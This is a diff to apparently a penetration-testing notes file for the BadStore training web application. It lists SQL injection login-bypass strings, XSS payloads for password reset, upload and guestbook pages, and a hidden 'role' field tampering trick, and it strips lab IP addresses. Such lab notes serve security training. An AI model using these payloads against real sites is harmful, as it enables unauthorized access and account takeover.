@@ -7,10 +7,9 @@ Login to My Account - 'or 1=1 or' admin' or 1=1# , admin' or '1'='1
 supplier login - admin' or 1=1# 
 
 Cross-site Scripting (XSS):
-Password Reset - </h2><script>alert(1);</script><h2> http://192.168.222.136/cgibin/badstore.cgi?action=moduser
-Supplier Upload Portal - <img src=x onerror=alert(1);> http://192.168.222.136/cgibin/badstore.cgi?action=supupload
-Guestbook -  </h2><script>alert(1);</script><h2> http://192.168.222.136/cgibin/badstore.cgi?action=doguestbook 
-
+Password Reset - </h2><script>alert(1);</script><h2> 
+Supplier Upload Portal - <img src=x onerror=alert(1);> 
+Guestbook -  </h2><script>alert(1);</script><h2> 
 Publicly Available Directories :
 robot.txt file
 /supplier directory
@@ -18,4 +17,4 @@ robot.txt file
 Web Parameter Tampering:
 ?action=admin
 <INPUT TYPE="hidden" NAME="role" VALUE="U"><INPUT TYPE="submit"
-METHOD="POST" ACTION="http://192.168.222.138/cgi-bin/badstore.cgi?action=register"
+METHOD="POST" ACTION="http://{your ip address}/cgi-bin/badstore.cgi?action=register"
